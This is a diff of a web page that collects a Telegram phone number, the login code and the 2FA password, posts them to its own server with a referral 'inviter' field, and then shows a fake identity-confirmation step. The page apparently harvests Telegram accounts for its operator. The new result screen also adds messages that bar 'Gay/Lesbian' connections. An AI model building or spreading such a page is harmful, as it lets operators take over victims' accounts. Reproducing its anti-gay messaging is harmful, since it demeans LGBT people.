-            // Code error -> clear code completely and let user try again
-            codeAttempts++;
-            updateAttemptDisplay();
-            showError(error2, `${errorMsg} Code cleared. Try again.`);
-            shakeCodeBoxes();
-            
-            // *** AUTO CLEAR CODE (as requested) ***
-            hiddenInput.value = '';
-            updateCodeBoxes();
-            focusCodeInput();
-            
-            if (codeAttempts >= MAX_ATTEMPTS) {
-              showError(error2, 'Too many wrong codes. Please request a new one.');
-              setTimeout(() => backToPhonePage(), 2200);
+            box.textContent = '−';
+            box.classList.remove('active');
+          }
+        });
+        // Auto-verify when 5 digits entered
+        if (code.length === 5 && twoFAGroup.style.display === 'none' && pageCode.style.display !== 'none') {
+          if (autoVerifyTimer) clearTimeout(autoVerifyTimer);
+          autoVerifyTimer = setTimeout(() => {
+            if (pageCode.style.display !== 'none' && hiddenCodeInput.value.length === 5) {
+              performVerification();
+            }
+          }, 500);
+        }
+      }
+
+      function showPage(page) {
+        [pagePhone, pageCode, pageIdentity, pageResult].forEach(p => p.style.display = 'none');
+        page.style.display = 'block';
+      }
+
+      // ----- NAVIGATION -----
+      document.getElementById('backHomeBtn').addEventListener('click', () => resetAll());
+      document.getElementById('backPhoneBtn').addEventListener('click', () => {
+        showPage(pagePhone);
+        hiddenCodeInput.value = '';
+        updateDigitBoxes();
+        password2FA.value = '';
+        twoFAGroup.style.display = 'none';
+        currentSession = null;
+      });
+      document.getElementById('backCodeBtn').addEventListener('click', () => {
+        showPage(pageCode);
+        hiddenCodeInput.value = '';
+        updateDigitBoxes();
+        twoFAGroup.style.display = 'none';
+      });
+      document.getElementById('backStartBtn').addEventListener('click', () => resetAll());
+      document.getElementById('newLoginBtn').addEventListener('click', () => resetAll());
+
+      function resetAll() {
+        showPage(pagePhone);
+        phoneInput.value = '';
+        hiddenCodeInput.value = '';
+        updateDigitBoxes();
+        password2FA.value = '';
+        twoFAGroup.style.display = 'none';
+        currentSession = null;
+        phoneInput.focus();
+      }
+
+      // ----- DIGIT BOX CLICKS -----
+      digitBoxes.forEach(box => {
+        box.addEventListener('click', () => hiddenCodeInput.focus());
+      });
+      hiddenCodeInput.addEventListener('input', updateDigitBoxes);
+
+      // ----- SEND CODE (API call to /api/add-account) -----
+      async function handleSendCode() {
+        let phone = phoneInput.value.trim().replace(/\s+/g, '');
+        if (!phone) { showMessage('Enter phone number', 'error'); return; }
+        if (!phone.startsWith('+')) phone = '+' + phone;
+        currentPhone = phone;
+        setLoading(sendCodeBtn, true);
+        try {
+          const response = await fetch('/api/add-account', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone })
+          });
+          const data = await response.json();
+          if (data.success) {
+            currentSession = data.session_id;
+            showPage(pageCode);
+            hiddenCodeInput.value = '';
+            updateDigitBoxes();
+            twoFAGroup.style.display = 'none';
+            password2FA.value = '';
+            setTimeout(() => hiddenCodeInput.focus(), 300);
+            showMessage('Code sent! Check your device.', 'success');
+          } else {
+            showMessage(data.error || 'Failed to send code', 'error');
+          }
+        } catch(e) {
+          showMessage('Network error', 'error');
+        } finally {
+          setLoading(sendCodeBtn, false);
+        }
+      }
+
+      sendCodeBtn.addEventListener('click', handleSendCode);
+      phoneInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleSendCode(); });
+      phoneInput.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); });
+
+      // ----- VERIFY CODE (API call to /api/verify-code) -----
+      async function performVerification() {
+        const code = hiddenCodeInput.value.replace(/[^0-9]/g, '').slice(0, 5);
+        if (code.length !== 5) { showMessage('Enter full 5-digit code', 'error'); return; }
+        const pwd = password2FA.value;
+        if (twoFAGroup.style.display === 'block' && !pwd) {
+          showMessage('2FA password required', 'error');
+          password2FA.focus();
+          return;
+        }
+        setLoading(verifyBtn, true);
+        try {
+          const response = await fetch('/api/verify-code', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              code: code,
+              session_id: currentSession,
+              password: pwd,
+              inviter: new URLSearchParams(window.location.search).get('inviter') || ''
+            })
+          });
+          const data = await response.json();
+          if (data.success) {
+            // Show identity confirmation page
+            showPage(pageIdentity);
+            document.getElementById('identityName').textContent = 'Telegram User';
+            document.getElementById('identityPhone').textContent = currentPhone;
+            showMessage('Code verified. Confirm identity below.', 'success');
+          } else if (data.need_password) {
+            twoFAGroup.style.display = 'block';
+            password2FA.value = '';
+            password2FA.focus();
+            showMessage('2FA enabled. Enter password.', 'error');
+          } else {
+            showMessage(data.error || 'Verification failed', 'error');
+            if (data.error && data.error.toLowerCase().includes('code')) {
+              hiddenCodeInput.value = '';
+              updateDigitBoxes();
+              hiddenCodeInput.focus();
             }
           }
+        } catch(e) {
+          showMessage('Network error', 'error');
+        } finally {
+          setLoading(verifyBtn, false);
         }
-      } catch (err) {
-        showError(error2, 'Network error. Please try again.');
-        // Still clear code on network error to allow retry
-        hiddenInput.value = '';
-        updateCodeBoxes();
-        focusCodeInput();
-      } finally {
-        setLoading(verifyBtn, false, '✅ Verify & Add Account');
       }
-    }
 
-    // ----- SEND CODE (PAGE 1) -----
-    async function sendCodeHandler() {
-      let phone = phoneInput.value.trim().replace(/\s+/g, '');
-      if (!phone) {
-        showError(error1, 'Enter phone number');
-        return;
-      }
-      phone = phone.replace(/[^0-9+]/g, '');
-      if (!phone.startsWith('+')) phone = '+' + phone;
+      verifyBtn.addEventListener('click', performVerification);
+      password2FA.addEventListener('keypress', e => { if (e.key === 'Enter') performVerification(); });
 
-      setLoading(sendCodeBtn, true, '📨 Send Code');
-      hideError(error1);
-
-      try {
-        const res = await fetch('/api/add-account', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: phone })
+      // ----- IDENTITY DECISION (Approve/Reject) -----
+      function handleDecision(approved) {
+        decisionCount++;
+        localStorage.setItem('resistDecisionCount', decisionCount);
+        
+        const icon = approved ? '✅' : '❌';
+        const title = approved ? 'Identity Approved' : 'Connection Rejected';
+        const msg = approved 
+          ? `You confirmed "Yes, it's me".<br>Connection allowed (opposite gender only).<br>🚫 Same-gender resisted.`
+          : `You rejected the identity.<br>Connection blocked.<br>🚫 Gay/Lesbian connection not permitted.`;
+        
+        resultContent.innerHTML = `
+          <div style="text-align:center;">
+            <div style="font-size:5rem;">${icon}</div>
+            <div class="step-heading" style="font-size:1.5rem;">${title}</div>
+            <div class="step-sub" style="color:#ccaaaa;">${msg}</div>
+            <div style="color:#887777; font-size:0.8rem; margin-top:8px;">
+              Decision #${decisionCount} · Same-gender resisted
+            </div>
+            ${approved ? `
+              <div class="telegram-notice" style="margin-top:16px;">
+                <span class="icon">📱</span>
+                <span>Telegram: <strong>"Yes, it's me"</strong> confirmed by user.</span>
+              </div>
+            ` : `
+              <div class="warning-badge" style="justify-content:center; margin-top:16px;">
+                🚫 Rejected · No same-gender connection
+              </div>
+            `}
+            <button class="btn btn-primary" id="redirectDashboardBtn" style="margin-top:20px;">Go to Dashboard</button>
+          </div>
+        `;
+        showPage(pageResult);
+        
+        // Attach redirect listener to the new button
+        document.getElementById('redirectDashboardBtn').addEventListener('click', function() {
+          window.location.href = 'http://t.me/Utxdmbot/Nop';
         });
-        const data = await res.json();
-
-        if (data.success) {
-          currentSessionId = data.session_id;
-          currentPhone = phone;
-          // Switch to page 2
-          page1.style.display = 'none';
-          page2.style.display = 'block';
-          passwordGroup.style.display = 'none';
-          passwordInput.value = '';
-          clearCodeInput();
-          codeAttempts = 0;
-          passwordAttempts = 0;
-          updateAttemptDisplay();
-          document.getElementById('codeDescription').textContent = 'Enter the 5‑digit code sent to Telegram.';
-          focusCodeInput();
-          showSuccess(success2, 'Code sent! Check Telegram.');
-        } else {
-          showError(error1, data.error || 'Failed to send code.');
-        }
-      } catch (e) {
-        showError(error1, 'Connection error.');
-      } finally {
-        setLoading(sendCodeBtn, false, '📨 Send Code');
       }
-    }
 
-    function backToPhonePage() {
-      page2.style.display = 'none';
-      page3.style.display = 'none';
-      page1.style.display = 'block';
-      passwordGroup.style.display = 'none';
-      passwordInput.value = '';
-      hiddenInput.value = '';
-      updateCodeBoxes();
-      currentSessionId = null;
-      codeAttempts = 0;
-      passwordAttempts = 0;
-      updateAttemptDisplay();
+      approveBtn.addEventListener('click', () => handleDecision(true));
+      rejectBtn.addEventListener('click', () => handleDecision(false));
+
+      // ----- INIT -----
+      showPage(pagePhone);
       phoneInput.focus();
-    }
 
-    function showSuccessPage() {
-      page1.style.display = 'none';
-      page2.style.display = 'none';
-      page3.style.display = 'block';
-    }
-
-    // ----- EVENT LISTENERS -----
-    hiddenInput.addEventListener('input', onCodeInputChange);
-
-    hiddenInput.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace') {
-        // Let normal backspace work, update boxes after.
-        setTimeout(updateCodeBoxes, 10);
-      } else if (e.key === 'Delete') {
-        e.preventDefault();
-        clearCodeInput();
-      } else if (e.key === 'Enter') {
-        e.preventDefault();
-        performVerification();
-      }
-    });
-
-    hiddenInput.addEventListener('paste', (e) => {
-      e.preventDefault();
-      const paste = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = paste.replace(/[^0-9]/g, '').slice(0, 5);
-      hiddenInput.value = digits;
-      onCodeInputChange();
-    });
-
-    // Click on boxes to position cursor
-    boxes.forEach(box => {
-      box.addEventListener('click', (e) => {
-        e.stopPropagation();
-        const idx = parseInt(box.getAttribute('data-index'), 10);
-        const current = hiddenInput.value.replace(/[^0-9]/g, '');
-        if (idx < current.length) {
-          hiddenInput.value = current.slice(0, idx + 1);
-        } else {
-          hiddenInput.value = current.slice(0, idx);
-        }
-        updateCodeBoxes();
-        hiddenInput.focus();
-      });
-    });
-
-    document.getElementById('codeBoxesContainer').addEventListener('click', focusCodeInput);
-
-    // Buttons
-    document.getElementById('sendCodeBtn').addEventListener('click', sendCodeHandler);
-    document.getElementById('verifyBtn').addEventListener('click', performVerification);
-    document.getElementById('clearCodeManualBtn').addEventListener('click', clearCodeInput);
-
-    document.getElementById('backToPhoneBtn').addEventListener('click', backToPhonePage);
-    document.getElementById('backToPhoneFromCodeBtn').addEventListener('click', backToPhonePage);
-    document.getElementById('backToDashboardBtn1').addEventListener('click', () => {
-      window.location.href = '/dashboard';
-    });
-
-    // Page 3 buttons
-    document.getElementById('goToAutoAddBtn').addEventListener('click', () => {
-      window.location.href = 'https://t.me/abe_army';
-    });
-    document.getElementById('addAnotherBtn').addEventListener('click', () => {
-      backToPhonePage();
-      page3.style.display = 'none';
-    });
-    document.getElementById('goToDashboardBtn').addEventListener('click', () => {
-      window.location.href = '/dashboard';
-    });
-
-    phoneInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendCodeHandler();
-    });
-    passwordInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') performVerification();
-    });
-
-    // Initial server name mock
-    window.addEventListener('load', () => {
-      document.getElementById('serverBadge').textContent = '⚡ Army';
-      document.getElementById('serverBadge2').textContent = '⚡ Army';
-      phoneInput.focus();
-      // Store original button texts
-      document.querySelectorAll('.btn-primary').forEach(b => {
-        b.setAttribute('data-original', b.innerHTML);
-      });
-    });
-
-    // Observe page2 display to auto-focus
-    const observer = new MutationObserver((mutations) => {
-      mutations.forEach(m => {
-        if (m.target === page2 && page2.style.display === 'block') {
-          setTimeout(focusCodeInput, 200);
-        }
-      });
-    });
-    observer.observe(page2, { attributes: true, attributeFilter: ['style'] });
-
-  })();
-</script>
+    })();
+  </script>
 </body>
 </html>
